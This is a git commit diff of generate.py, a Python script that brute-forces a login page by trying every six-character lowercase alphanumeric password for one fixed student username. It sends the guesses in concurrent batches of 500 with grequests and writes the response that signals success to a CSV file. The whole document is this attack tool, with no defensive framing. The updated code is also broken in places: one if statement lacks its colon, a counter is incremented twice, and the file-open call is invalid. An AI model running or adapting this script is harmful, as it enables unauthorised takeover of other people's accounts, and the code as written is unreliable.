0072c357e1853091a7cd5824fe2662410315c104
muhdamrullah <muneorion@gmail.com>
2015-10-04 17:35:02 +0800

    Update generate.py

--- generate.py
+++ generate.py
@@ -1,29 +1,37 @@
 import grequests
 import itertools
+import csv
 
 def do_something(response, *args, **kwargs):
     print response
 
 payloads = []
 counter = 0
+initial_ping = 0
 for ele in itertools.product("0123456789abcdefghijklmnopqrstuvwxyz",repeat=6):
     elements = "".join(ele)
     mayload = {'username': "512563", 'password': elements, 'role': "student"}
     print elements
     payloads.append(mayload)
     counter += 1
-    if (counter == 500):
-        unsent_request = []
+    initial_ping += 1
+    if (0 < initial_ping < 500000)
+        counter += 1
+        if (counter == 500):
+            unsent_request = []
 
-        for payload_single in payloads:
-            unsent_request.append(grequests.post('https://website/accounts/login', hooks={'response': do_something}, data=payload_single))
+            for payload_single in payloads:
+                unsent_request.append(grequests.post('https://website/accounts/login', hooks={'response': do_something}, data=payload_single))
 
-        responses =  grequests.map(unsent_request)
-        for r in responses:
-            print r.text
-            word = 'true'
-            if word in r.text:
-                break
-        payloads = []
-        counter = 0
-        continue
+            responses =  grequests.map(unsent_request)
+            for r in responses:
+                print r.text
+                word = 'true'
+                if word in r.text:
+                    with open('result.csv', 'wb', newline='') as fp:
+                        a = csv.writer(fp, delimiter=',')
+                        a.writerows(r.text)
+                    break
+            payloads = []
+            counter = 0
+            continue
